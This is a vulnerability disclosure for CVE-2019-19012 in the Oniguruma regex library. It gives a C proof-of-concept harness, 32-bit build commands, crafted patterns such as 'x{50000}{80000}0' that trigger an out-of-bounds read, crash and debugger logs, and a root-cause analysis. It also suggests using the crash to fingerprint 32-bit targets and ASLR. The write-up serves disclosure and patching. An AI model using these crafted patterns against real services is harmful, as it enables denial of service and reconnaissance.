# CVE-2019-19012

An integer overflow in the search_in_range function in regexec.c in Oniguruma 6.x before 6.9.4_rc2 leads to an out-of-bounds read, in which the offset of this read is under the control of an attacker. (This only affects the 32-bit compiled version). Remote attackers can cause a denial-of-service or information disclosure, or possibly have unspecified other impact, via a crafted regular expression.

**Researcher: ManhND of The Tarantula Team, VinCSS (a member of Vingroup)**

# What is Oniguruma
Oniguruma by K. Kosako is a BSD licensed regular expression library that supports a variety of character encodings. The Ruby programming language, in version 1.9, as well as PHP's multi-byte string module (since PHP5), use Oniguruma as their regular expression engine. It is also used in products such as Atom, GyazMail Take Command Console, Tera Term, TextMate, Sublime Text and SubEthaEdit.

# Proof of Concept
Following is a PoC in C. It receives the first argument as the pattern and 2th argument as the string to be matched.

```C++
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "oniguruma.h"

static int
search(regex_t* reg, unsigned char* str, unsigned char* end)
{
  int r;
  unsigned char *start, *range;
  OnigRegion *region;

  region = onig_region_new();

  start = str;
  range = end;
  r = onig_search(reg, str, end, start, range, region, ONIG_OPTION_NONE);
  if (r >= 0 ) {
    int i;

    fprintf(stdout, "match at %d  (%s)\n", r,
            ONIGENC_NAME(onig_get_encoding(reg)));
    for (i = 0; i < region->num_regs; i++) {
      fprintf(stdout, "%d: (%d-%d)\n", i, region->beg[i], region->end[i]);
    }
  }
  else if (r == ONIG_MISMATCH) {
    fprintf(stdout, "search fail (%s)\n",
            ONIGENC_NAME(onig_get_encoding(reg)));
  }
  else { /* error */
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r);
    fprintf(stdout, "ERROR: %s\n", s);
    fprintf(stdout, "  (%s)\n", ONIGENC_NAME(onig_get_encoding(reg)));
    
    onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
    return -1;
  }

  onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
  return 0;
}

int main(int argc, char* argv[])
{
  int r;
  regex_t* reg;
  OnigErrorInfo einfo;

  char *pattern = argv[1];
  char *pattern_end = pattern + strlen(pattern);
  OnigEncodingType *enc = ONIG_ENCODING_ASCII;

  char* str = argv[2];
  char* str_end = str+strlen(str);

  onig_initialize(&enc, 1);
  r = onig_new(&reg, (unsigned char *)pattern, (unsigned char *)pattern_end,
               ONIG_OPTION_IGNORECASE, enc, ONIG_SYNTAX_DEFAULT, &einfo);
  if (r != ONIG_NORMAL) {
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r, &einfo);
    fprintf(stdout, "ERROR: %s\n", s);
    onig_end();

    if (r == ONIGERR_PARSER_BUG ||
        r == ONIGERR_STACK_BUG  ||
        r == ONIGERR_UNDEFINED_BYTECODE ||
        r == ONIGERR_UNEXPECTED_BYTECODE) {
      return -2;
    }
    else
      return -1;
  }

  if (onigenc_is_valid_mbc_string(enc, str, str_end) != 0) {
    r = search(reg, str, str_end);
  } else {
    fprintf(stdout, "Invalid string\n");
  }

  onig_free(reg);
  onig_end();
  return 0;
}
```

Compile Oniguruma and the PoC in 32 bit:

```console
./configure CC=gcc CFLAGS="-m32 -O0 -ggdb3 -fsanitize=address" LDFLAGS="-m32 -O0 -ggdb3 -fsanitize=address" && make
gcc -m32 -fsanitize=address -O0 -I./oniguruma/src -ggdb3 PoC.c ./oniguruma/src/.libs/libonig.a -o PoC
```

To trigger the bug, supply the string "x" and patterns in the format "x{a}{b}0", where a and b are smaller than 100000. For example:

```console
root@manh-ubuntu16:~/fuzz/fuzz_oniguruma# ./PoC x{50000}{80000}0 x
ASAN:SIGSEGV
=================================================================
==4961==ERROR: AddressSanitizer: SEGV on unknown address 0xee5a5fdb (pc 0x080bf994 bp 0xffef2418 sp 0xffef23e0 T0)
    #0 0x80bf993 in sunday_quick_search /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan-32/src/regexec.c:4831
    #1 0x80c0685 in forward_search /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan-32/src/regexec.c:4956
    #2 0x80c2830 in search_in_range /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan-32/src/regexec.c:5375
    #3 0x80c17f4 in onig_search /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan-32/src/regexec.c:5168
    #4 0x8048cc4 in search /root/fuzz/fuzz_oniguruma/poc-dmax-search-in-range.c:17
    #5 0x8049536 in main /root/fuzz/fuzz_oniguruma/poc-dmax-search-in-range.c:78
    #6 0xf7049636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #7 0x8048b00  (/root/fuzz/fuzz_oniguruma/poc-dmax-search-in-range+0x8048b00)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan-32/src/regexec.c:4831 sunday_quick_search
==4961==ABORTING
root@manh-ubuntu16:~/fuzz/fuzz_oniguruma#
```

# Analysis

**Referenced source code version: ca7ddbd858dcdc8322d619cf41ab125a2603a0d4**

The root cause comes from the line regex.c:5365, where an integer overflow occurs:

```vim
5360	      sch_range = (UChar* )range;
5361	      if (reg->dmax != 0) {
5362	        if (reg->dmax == INFINITE_LEN)
5363	          sch_range = (UChar* )end;
5364	        else {
5365	          sch_range += reg->dmax;  //// => overflow
5366	          if (sch_range > end) sch_range = (UChar* )end;
5367	        }
5368	      }

```
Integer overflow occurs when reg->dmax gets large enough value. reg->dmax seems to be some distance which is equal to \<number\> in pattern "x{\<number\>}y", where x can be any character, y must be a digit. For example, if provided pattern "a{1000}5", reg->dmax = 1000. See the following gdb log with "./PoC a{1000}5 b":

```console
root@manh-ubuntu16:~/fuzz/fuzz_oniguruma# gdb ./PoC
...
(gdb) b 61 # set breakpoint after onig_new
Breakpoint 1 at 0x804943d: file poc-dmax-search-in-range.c, line 61.
(gdb) r a{1000}0 b
Starting program: /root/fuzz/fuzz_oniguruma/PoC a{1000}0 b
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, main (argc=3, argv=0xffffd634) at poc-dmax-search-in-range.c:61
warning: Source file is more recent than executable.
61	  if (r != ONIG_NORMAL) {
(gdb) p *reg
$1 = {ops = 0xf5b03760, ocs = 0xf5900be0, ops_curr = 0xf5b037b0, ops_used = 5, 
  ops_alloc = 8, string_pool = 0x0, string_pool_end = 0x0, num_mem = 0, 
  num_repeat = 1, num_empty_check = 0, num_call = 0, capture_history = 0, 
  push_mem_start = 0, push_mem_end = 0, empty_status_mem = 0, 
  stack_pop_level = 0, repeat_range_alloc = 4, repeat_range = 0xf6100f90, 
  enc = 0x8139e00 <OnigEncodingASCII>, options = 1, 
  syntax = 0x8127160 <OnigSyntaxOniguruma>, case_fold_flag = 1073741824, 
  name_table = 0x0, optimize = 2, threshold_len = 1001, anchor = 0, 
  anchor_dmin = 0, anchor_dmax = 0, sub_anchor = 0, exact = 0xf6500430 "0", 
  exact_end = 0xf6500431 "", 
  map = '\002' <repeats 48 times>, "\001", '\002' <repeats 207 times>, 
  map_offset = 1, dmin = 1000, dmax = 1000, extp = 0x0}
(gdb)
```

With patterns in form "x{\<number\>}y", dmax gets the largest value as 100000, because repeat number cannot be larger than 100000 (ONIG_MAX_REPEAT_NUM). However, if we provide patterns in format "x{\<number1\>}{\<number2\>}y", we will have that reg->dmax = number1 * number2. This multiplication is made at the following code (regcomp.c:6157):

```vim
6156	      else {
6157	        max = distance_multiply(xo.len.max, qn->upper);    //// => multiply into dmax
6158	      }
```
See the following gdb log with "./PoC a{1000}{2}5 b":

```console
(gdb) r a{1000}{2}5 b
...
Breakpoint 1, main (argc=3, argv=0xffffd634) at poc-dmax-search-in-range.c:61
61	  if (r != ONIG_NORMAL) {
(gdb) p *reg
$3 = {ops = 0xf5b03760, ocs = 0xf5900be0, ops_curr = 0xf5b037b0, ops_used = 5, 
  ops_alloc = 8, string_pool = 0x0, string_pool_end = 0x0, num_mem = 0, 
  num_repeat = 1, num_empty_check = 0, num_call = 0, capture_history = 0, 
  push_mem_start = 0, push_mem_end = 0, empty_status_mem = 0, 
  stack_pop_level = 0, repeat_range_alloc = 4, repeat_range = 0xf6100f90, 
  enc = 0x8139e00 <OnigEncodingASCII>, options = 1, 
  syntax = 0x8127160 <OnigSyntaxOniguruma>, case_fold_flag = 1073741824, 
  name_table = 0x0, optimize = 2, threshold_len = 2001, anchor = 0, 
  anchor_dmin = 0, anchor_dmax = 0, sub_anchor = 0, exact = 0xf6500430 "5", 
  exact_end = 0xf6500431 "", 
  map = '\002' <repeats 53 times>, "\001", '\002' <repeats 202 times>, 
  map_offset = 1, dmin = 2000, dmax = 2000, extp = 0x0}
(gdb)

```

Even more, the repeat number can be nested any times as we want:

```
"x{n1}{n2}...{nk}5" => dmax = n1 * n2 * ... * nk

```

So dmax (an unsigned integer) can be any value in range [0, 0xffffffff), and integer overflow at sch_range += reg->dmax; is definitely possible. The same applies to reg->dmin. However, this integer overflow is only for 32 bit version. With 64 bit version, sch_range is 64 bit pointer, and dmax is still unsigned integer, so integer overflow can not happen.

The PoC above gets crashed because in sunday_quick_search, the integer overflow leads to some invalid memory address dereferenced:

```C++
while (s < end) {
    p = s;
    t = tail;
    while (*p == *t) {                             // => p points to invalid address
      if (t == target) return (UChar* )p;
      p--; t--;
    }
    if (s + map_offset >= text_end) break;
    s += reg->map[*(s + map_offset)];
  }
```

If ASLR is enabled and if we provide suitable pattern, ASLR sometimes maps valid page at the dereferenced address, sometimes maps no page, so the PoC will sometimes crash, sometimes does not. So this PoC can be used to detect if the target system is 32 bit or 64 bit. And if it is 32 bit, we can detect if ASLR is enabled or not.

# Reference

* [https://github.com/kkos/oniguruma/issues/164](https://github.com/kkos/oniguruma/issues/164)
- [https://en.wikipedia.org/wiki/Oniguruma](https://en.wikipedia.org/wiki/Oniguruma)
